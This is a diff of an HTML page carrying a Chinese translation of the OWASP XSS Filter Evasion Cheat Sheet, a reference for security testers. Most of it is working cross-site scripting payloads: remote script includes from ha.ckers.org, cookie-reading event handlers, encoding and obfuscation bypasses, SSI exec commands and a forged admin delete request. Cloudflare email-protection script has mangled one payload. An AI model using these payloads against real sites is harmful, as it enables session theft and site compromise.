@@ -3,14 +3,14 @@
 			<head>
 			     <title>XSS Filter Evasion Cheat Sheet 中文版 - 老道</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/1955">http://drops.wooyun.org/tips/1955</a></h1>
 				
       <p>
-        <h1>前言</h1>
+        </p><h1>前言</h1>
 
-<hr />
+<hr>
 
 <p>译者注：
 翻译本文的最初原因是当我自己看到这篇文章后，觉得它是非常有价值。但是这么著名的一个备忘录却一直没有人把它翻译成中文版。很多人仅仅是简单的把文中的各种代码复制下来，然后看起来很刁的发在各种论坛上，不过你要真去认真研读这些代码，就会完全不知所云了。原因是这篇文章最精华的部分是代码的解释而非代码本身。</p>
@@ -33,7 +33,7 @@
 
 <p>这篇文章的主要目的是去给应用安全测试者提供一份xss漏洞检测指南。文章的初始内容由RSnake提供给OWASP，从他的xss备忘录: http://ha.ckers.org/xss.html 。目前这个网页已经重定向到我们这里，我们打算维护和完善它。OWASP的第一个防御备忘录项目：the XSS (Cross Site Scripting) Prevention Cheat Sheet灵感来源于RSnake的 XSS Cheat Sheet，所以我们对他给予我们的启发表示感谢。我们想要去创建短小简单的参考给开发者去帮助他们预防xss漏洞，而不是创建一个复杂的备忘录去简单的告诉他们需要去预防各种千奇百怪的攻击。所以，OWASP备忘录系列诞生了。</p>
 
-<hr />
+<hr>
 
 <h1>测试</h1>
 
@@ -41,7 +41,7 @@
 
 <p>请注意大部分的xss攻击向量已经在其代码下方给出了测试过的浏览器列表。</p>
 
-<hr />
+<hr>
 
 <h2>xss 探测器</h2>
 
@@ -52,7 +52,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 &gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>xss 探测器2</h2>
 
@@ -61,7 +61,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>'';!--"&lt;XSS&gt;=&amp;{()}
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>无过滤绕过</h2>
 
@@ -70,9 +70,9 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
 </code></pre>
 
-<hr />
+<hr>
 
-<hr />
+<hr>
 
 <h2>通过javascript指令实现的图片xss</h2>
 
@@ -81,21 +81,21 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC="javascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>无引号无分号</h2>
 
 <pre><code>&lt;IMG SRC=javascript:alert('XSS')&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>不区分大小写的xss攻击向量</h2>
 
 <pre><code>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>html 实体</h2>
 
@@ -104,7 +104,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC=javascript:alert("XSS")&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>重音符混淆</h2>
 
@@ -113,7 +113,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>畸形的A标签</h2>
 
@@ -127,7 +127,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>畸形的IMG标签</h2>
 
@@ -136,7 +136,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>fromCharCode</h2>
 
@@ -145,7 +145,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>默认SRC属性去绕过SRC域名检测过滤器</h2>
 
@@ -154,38 +154,38 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>默认SRC属性通过省略它的值</h2>
 
 <pre><code>&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>默认SRC属性通过完全不设置它</h2>
 
 <pre><code>&lt;IMG onmouseover="alert('xxs')"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>通过error事件触发alert</h2>
 
 <pre><code>&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>十进制html编码引用</h2>
 
-<p>所有在<IMG>使用javascript指令的xss示例将无法工作在 Firefox 或 Netscape 8.1+，因为它们使用了 Gecko 渲染引擎。使用 XSS <a href="http://ha.ckers.org/xsscalc.html">Calculator</a> 获取更多信息。</p>
+<p>所有在<img>使用javascript指令的xss示例将无法工作在 Firefox 或 Netscape 8.1+，因为它们使用了 Gecko 渲染引擎。使用 XSS <a href="http://ha.ckers.org/xsscalc.html">Calculator</a> 获取更多信息。</p>
 
 <pre><code>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
 &amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>结尾没有分号的十进制html编码引用</h2>
 
@@ -194,7 +194,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>结尾没有分号的十六进制html编码引用</h2>
 
@@ -203,7 +203,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>内嵌TAB</h2>
 
@@ -212,7 +212,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC="jav   ascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>内嵌被编码的TAB</h2>
 
@@ -221,7 +221,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>内嵌换行符去分开xss代码</h2>
 
@@ -230,7 +230,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>编码回车符去分开xss代码</h2>
 
@@ -239,7 +239,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>没有分割的javascript指令</h2>
 
@@ -248,7 +248,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>图片元素中javascript之前的空格和元字符为xss</h2>
 
@@ -257,7 +257,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>非字母数字字符xss</h2>
 
@@ -276,7 +276,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;SCRIPT/SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>附加的开括号</h2>
 
@@ -285,7 +285,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>没关闭的script标签</h2>
 
@@ -294,16 +294,16 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>script标签中的协议解析</h2>
 
-<p>这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了</SCRIPT>在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 ".j"是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。</p>
+<p>这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 ".j"是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。</p>
 
 <pre><code>&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>半开的HTML/JavaScript xss向量</h2>
 
@@ -312,7 +312,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG SRC="javascript:alert('XSS')"
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>双开尖括号</h2>
 
@@ -321,7 +321,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>转义javascript中的转义</h2>
 
@@ -330,7 +330,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>\";alert('XSS');//
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>闭合title标签</h2>
 
@@ -340,42 +340,42 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>INPUT image</h2>
 
 <pre><code>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>BODY image</h2>
 
 <pre><code>&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>IMG DYNSRC(视频剪辑)</h2>
 
 <pre><code>&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>IMG lowsrc（低分辨率图片）</h2>
 
 <pre><code>&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>List-style-image</h2>
 
 <pre><code>&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>List-style-image</h2>
 
@@ -384,21 +384,21 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>VBscript in an image</h2>
 
 <pre><code>&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>Livescript (仅适用于老版本的Netscape)</h2>
 
 <pre><code>&lt;IMG SRC="livescript:[code][/code]"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>BODY 标签</h2>
 
@@ -407,7 +407,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;BODY ONLOAD=alert('XSS')&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>事件处理程序</h2>
 
@@ -519,28 +519,28 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
  105. seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>BGSOUND(背景音乐)</h2>
 
 <pre><code>&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>&amp; JavaScript 包含</h2>
 
 <pre><code>&lt;BR SIZE="&amp;{alert('XSS')}"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>样式表</h2>
 
 <pre><code>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>远程样式表</h2>
 
@@ -549,7 +549,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>远程样式表2</h2>
 
@@ -558,7 +558,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>远程样式表3</h2>
 
@@ -567,7 +567,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;META HTTP-EQUIV="Link" Content="&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>远程样式表4</h2>
 
@@ -576,7 +576,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;STYLE&gt;BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}&lt;/STYLE&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>分隔javascript在STYLE标签</h2>
 
@@ -585,7 +585,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>STYLE属性中使用注释去分隔表达式</h2>
 
@@ -594,7 +594,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <pre><code>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>IMG样式的表达式</h2>
 
@@ -604,28 +604,28 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>STYLE标签（仅支持老版本的Netscape）</h2>
 
 <pre><code>&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>使用background-image的style标签</h2>
 
 <pre><code>&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>使用background的style标签</h2>
 
 <pre><code>&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>匿名html标签的属性</h2>
 
@@ -634,7 +634,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>本地 htc 文件</h2>
 
@@ -643,7 +643,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;XSS STYLE="behavior: url(xss.htc);"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>US-ASCII编码</h2>
 
@@ -652,7 +652,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>¼script¾alert(¢XSS¢)¼/script¾
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>META</h2>
 
@@ -661,7 +661,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>META using data</h2>
 
@@ -670,7 +670,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>额外url参数的META</h2>
 
@@ -679,7 +679,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>IFRAME</h2>
 
@@ -688,7 +688,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>IFRAME 基于事件</h2>
 
@@ -697,7 +697,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>FRAME</h2>
 
@@ -706,14 +706,14 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>TABLE</h2>
 
 <pre><code>&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>TD</h2>
 
@@ -722,14 +722,14 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>DIV background-image</h2>
 
 <pre><code>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>使用 unicoded编码xss利用代码的DIV background-image</h2>
 
@@ -738,7 +738,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>附加额外字符的DIV background-image</h2>
 
@@ -747,7 +747,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>DIV expression</h2>
 
@@ -756,7 +756,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>html条件选择注释块</h2>
 
@@ -767,7 +767,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
  &lt;![endif]--&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>BASE标签</h2>
 
@@ -776,7 +776,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;BASE HREF="javascript:alert('XSS');//"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>OBJECT标签</h2>
 
@@ -785,7 +785,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>使用一个你可以载入包含有xss代码的flash文件的 EMBED 标签</h2>
 
@@ -794,7 +794,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
 <pre><code>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>使用在flash中的ActionScript可以混淆你的xss向量</h2>
 
@@ -805,7 +805,7 @@ d="alert('XSS');\")";
 eval(a+b+c+d);
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>CDATA混淆的 XML数据岛</h2>
 
@@ -815,15 +815,15 @@ eval(a+b+c+d);
 &lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>使用XML数据岛生成含有javascript代码的当前域xml文件</h2>
 
 <p>它是相同的同上面仅仅代替XML文件为当前域文件。你可以看到结果在下面。
-    <XML SRC="xsstest.xml" ID=I></XML>
-    <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></p>
+    <xml src="xsstest.xml" id="I"></xml>
+    <span datasrc="#I" datafld="C" dataformatas="HTML"></span></p>
 
-<hr />
+<hr>
 
 <h2>HTML+TIME 在XML中</h2>
 
@@ -836,7 +836,7 @@ eval(a+b+c+d);
 &lt;/BODY&gt;&lt;/HTML&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>简单的修改字符去绕过过滤器对 ".js"的过滤</h2>
 
@@ -845,7 +845,7 @@ eval(a+b+c+d);
 <pre><code>&lt;SCRIPT SRC="http://ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>SSI (服务器端包含)</h2>
 
@@ -854,7 +854,7 @@ eval(a+b+c+d);
 <pre><code>&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>PHP</h2>
 
@@ -864,7 +864,7 @@ eval(a+b+c+d);
 echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>嵌入命令的IMG</h2>
 
@@ -873,7 +873,7 @@ echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
 <pre><code>&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>嵌入命令的IMG II</h2>
 
@@ -882,7 +882,7 @@ echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
 <pre><code>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>Cookie篡改</h2>
 
@@ -891,7 +891,7 @@ echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
 <pre><code>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>UTF-7编码</h2>
 
@@ -900,7 +900,7 @@ echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
 <pre><code>&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 </code></pre>
 
-<hr />
+<hr>
 
 <h2>使用HTML 引用封装的xss</h2>
 
@@ -993,7 +993,7 @@ Firefox 使用 Google的"feeling lucky" 函数去重定向用户输入的任何�
 <p><strong>Google "feeling lucky" II</strong>
 这是使用一个小技巧让他工作在Firefox，因为只有它实现了 "feeling lucky" 函数。不像下一个例子，它是无法工作在 Opera ，由于 Opera认为它是一种老的钓鱼攻击。它是一个简单的畸形url。如果你点击弹出框的确定按钮它将工作。但是由于这是一个错误对话框，我是说Opera是不支持它。它也不再被支持在 Firefox 2.0。</p>
 
-<pre><code>&lt;A HREF="http:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b89797d0d996dbd3ddcacb96d7cadff8dfd7d7dfd4dd">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>"&gt;XSS&lt;/A&gt;
+<pre><code>&lt;A HREF="http:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b89797d0d996dbd3ddcacb96d7cadff8dfd7d7dfd4dd">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>"&gt;XSS&lt;/A&gt;
 </code></pre>
